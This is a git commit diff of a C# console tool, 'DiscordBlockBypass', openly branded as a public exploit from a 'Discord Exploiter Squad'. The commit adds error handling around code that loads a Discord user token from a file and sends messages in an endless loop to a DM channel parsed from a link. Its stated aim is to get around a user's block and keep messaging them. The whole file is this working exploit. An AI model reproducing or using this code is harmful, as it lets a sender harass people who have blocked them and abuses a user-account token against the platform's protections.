0fe14507daa00e60a02e770c69745d83f66efecd
Yaekith <47884923+Yaekith@users.noreply.github.com>
2020-07-12 10:53:29 +0800

    Update Program.cs

--- Program.cs
+++ Program.cs
@@ -15,46 +15,64 @@ namespace DiscordBlockBypass
 
         static void ForceSendMessage(string channelId, string message)
         {
-            using (HttpClient client = new HttpClient())
+            try
             {
-                client.DefaultRequestHeaders.Add("Authorization", UserToken);
-                var response = client.PostAsync($"https://discordapp.com/api/v6/channels/{channelId}/messages", new StringContent(JsonConvert.SerializeObject(new MessageBody() { content = message, nonce = null, tts = false }), Encoding.UTF8, "application/json"));
-                if (response.Result.StatusCode == System.Net.HttpStatusCode.OK) Console.WriteLine($"Successfully force sent message to channelId: {channelId}. Fix your shit discord.");
+                using (HttpClient client = new HttpClient())
+                {
+                    client.DefaultRequestHeaders.Add("Authorization", UserToken);
+                    var response = client.PostAsync($"https://discordapp.com/api/v6/channels/{channelId}/messages", new StringContent(JsonConvert.SerializeObject(new MessageBody() { content = message, nonce = null, tts = false }), Encoding.UTF8, "application/json"));
+                    if (response.Result.StatusCode == System.Net.HttpStatusCode.OK) Console.WriteLine($"Successfully force sent message to channelId: {channelId}. Fix your shit discord.");
+                }
+            }
+            catch(Exception e)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine($"Something went wrong. Exception Details: {e.ToString()} || Please Report this to Yaekith on telegram.");
+                Console.ForegroundColor = ConsoleColor.White;
             }
         }
 
         static void Main(string[] args)
         {
-            Console.Title = "https://exploiting-discord-for.fun || Discord Exploiter Squad was here || https://discord.gg/anarchyy (https://discord.gg/HUXcxEu) || Public Exploit: Block Bypass Meme (Found by Yaekith in 2018)";
-            if (!File.Exists("Token.txt"))
+            try
+            {
+                Console.Title = "https://exploiting-discord-for.fun || Discord Exploiter Squad was here || https://discord.gg/anarchyy (https://discord.gg/HUXcxEu) || Public Exploit: Block Bypass Meme (Found by Yaekith in 2018)";
+                if (!File.Exists("Token.txt"))
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("No Token file was found. Please enter a token: ");
+                    string token = Console.ReadLine();
+                    File.WriteAllText("Token.txt", token);
+                    Console.ForegroundColor = ConsoleColor.White;
+                }
+                UserToken = File.ReadAllText("Token.txt");
+                Console.WriteLine("Enter Message Link: ");
+                string link = Console.ReadLine();
+                if (!link.Contains("discordapp.com/channels/@me"))
+                {
+                    Console.WriteLine("Invalid Message Link. Press any key and try again.");
+                    Console.ReadLine();
+                    Console.Clear();
+                    Main(null);
+                }
+                else
+                {
+                    var ChannelID = link.Split('/')[5].Split('/')[0];
+                    Console.Title = $"https://exploiting-discord-for.fun || Public Exploit: Block Bypass Meme (Found by Yaekith in 2018) || Locked Channel: {ChannelID.ToString()}";
+                    Console.WriteLine($"Sending Messages to ChannelID: {ChannelID}");
+                    for (; ; )
+                    {
+                        Console.WriteLine("Enter Message to Send: ");
+                        string msg = Console.ReadLine();
+                        ForceSendMessage(ChannelID, msg);
+                    }
+                }
+            }
+            catch(Exception e)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("No Token file was found. Please enter a token: ");
-                string token = Console.ReadLine();
-                File.WriteAllText("Token.txt", token);
+                Console.WriteLine($"Something went wrong. Exception Details: {e.ToString()} || Please Report this to Yaekith on telegram.");
                 Console.ForegroundColor = ConsoleColor.White;
-            }
-            UserToken = File.ReadAllText("Token.txt");
-            Console.WriteLine("Enter Message Link: ");
-            string link = Console.ReadLine();
-            if (!link.Contains("discordapp.com/channels/@me"))
-            {
-                Console.WriteLine("Invalid Message Link. Press any key and try again.");
-                Console.ReadLine();
-                Console.Clear();
-                Main(null);
-            }
-            else
-            {
-                var ChannelID = link.Split('/')[5].Split('/')[0];
-                Console.Title = $"https://exploiting-discord-for.fun || Public Exploit: Block Bypass Meme (Found by Yaekith in 2018) || Locked Channel: {ChannelID.ToString()}";
-                Console.WriteLine($"Sending Messages to ChannelID: {ChannelID}");
-                for(; ;)
-                {
-                    Console.WriteLine("Enter Message to Send: ");
-                    string msg = Console.ReadLine();
-                    ForceSendMessage(ChannelID, msg);
-                }
             }
             Console.ReadLine();
         }
